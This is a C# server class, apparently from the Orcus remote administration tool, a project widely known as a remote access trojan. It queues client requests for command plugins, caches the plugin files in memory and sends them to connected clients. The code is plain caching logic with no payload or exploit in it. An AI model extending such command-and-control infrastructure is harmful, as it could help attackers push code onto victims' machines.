using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Timers;
using NLog;
using Orcus.Server.Core.Config;
using Orcus.Server.Core.Database;
using Orcus.Server.Core.Utilities;

namespace Orcus.Server.Core.DynamicCommands
{
    public class DynamicCommandPluginSender
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private readonly DatabaseManager _databaseManager;
        private readonly Dictionary<int, DynamicCommandPluginCacheItem> _pluginCache;
        private readonly ActionsQueue<DynamicCommandPluginRequest> _requests;
        private readonly object _cacheLock = new object();
        private readonly Timer _cacheClearingTimer;
        private readonly int _maxPluginCacheSize;

        public DynamicCommandPluginSender(DatabaseManager databaseManager)
        {
            _databaseManager = databaseManager;
            _requests = new ActionsQueue<DynamicCommandPluginRequest>(ProcessRequest)
            {
                ParallelExecutionLimit =
                    int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("DYNAMIC_COMMAND", "MaxParallelPluginUploads"))
            };
            _pluginCache = new Dictionary<int, DynamicCommandPluginCacheItem>();
            _cacheClearingTimer = new Timer(1000 * 60); //1 min interval
            _cacheClearingTimer.Elapsed += CacheClearingTimerOnElapsed;
            _maxPluginCacheSize =
                int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("DYNAMIC_COMMAND", "MaxPluginCacheSize"));
        }

        private void CacheClearingTimerOnElapsed(object sender, ElapsedEventArgs elapsedEventArgs)
        {
            Logger.Debug("Begin clearing cache and removing unused data");

            lock (_cacheLock)
            {
                foreach (var cacheItem in _pluginCache.ToList())
                {
                    if (DateTime.UtcNow - cacheItem.Value.LastUsage > TimeSpan.FromSeconds(60))
                    {
                        _pluginCache.Remove(cacheItem.Key);
                        Logger.Debug("Resource item {0} was removed", cacheItem.Key);
                    }
                }

                if (_pluginCache.Count == 0)
                    _cacheClearingTimer.Enabled = false;
            }
        }

        public void RequestPlugin(Client client, int resourceId)
        {
            Logger.Debug("Client CI-{0} requests static command plugin with resource id {1}", client.Id, resourceId);
            _requests.Enqueue(new DynamicCommandPluginRequest(client, resourceId));
        }

        private void ProcessRequest(DynamicCommandPluginRequest dynamicCommandPluginRequest)
        {
            if (dynamicCommandPluginRequest.Client.IsDisposed)
                return;

            var dynamicCommandPlugin = GetCacheItem(dynamicCommandPluginRequest.ResourceId);
            if (dynamicCommandPlugin == null)
                return;

            dynamicCommandPlugin.LastUsage = DateTime.UtcNow;

            if (dynamicCommandPlugin.Data != null)
                dynamicCommandPluginRequest.Client.SendStaticCommandPlugin(dynamicCommandPlugin.Data,
                    dynamicCommandPluginRequest.ResourceId);
            else
                dynamicCommandPluginRequest.Client.SendStaticCommandPlugin(dynamicCommandPlugin.Filename,
                    dynamicCommandPluginRequest.ResourceId);
        }

        private DynamicCommandPluginCacheItem GetCacheItem(int resourceId)
        {
            Logger.Debug("Get resource item {0}", resourceId);

            lock (_cacheLock)
            {
                DynamicCommandPluginCacheItem cacheItem;
                if (!_pluginCache.TryGetValue(resourceId, out cacheItem))
                {
                    var pluginFile = _databaseManager.GetStaticCommandPlugin(resourceId);
                    if (pluginFile == null)
                    {
                        Logger.Error("Unable to find static command plugin with id {0}", resourceId);
                        return null;
                    }

                    Logger.Debug("Resource item {0} name is {1}, load in memory", resourceId, pluginFile.Name);

                    byte[] data = null;
                    if (_maxPluginCacheSize == 0 || pluginFile.Length < _maxPluginCacheSize)
                        data = File.ReadAllBytes(pluginFile.FullName);

                    cacheItem = new DynamicCommandPluginCacheItem(pluginFile.FullName, data);
                    _pluginCache.Add(resourceId, cacheItem);

                    Logger.Debug("Resource item {0} was added to cache", resourceId);

                    _cacheClearingTimer.Enabled = true;
                }
                else
                    Logger.Debug("Resource item {0} is already loaded in memory", resourceId);
                return cacheItem;
            }
        }
    }
}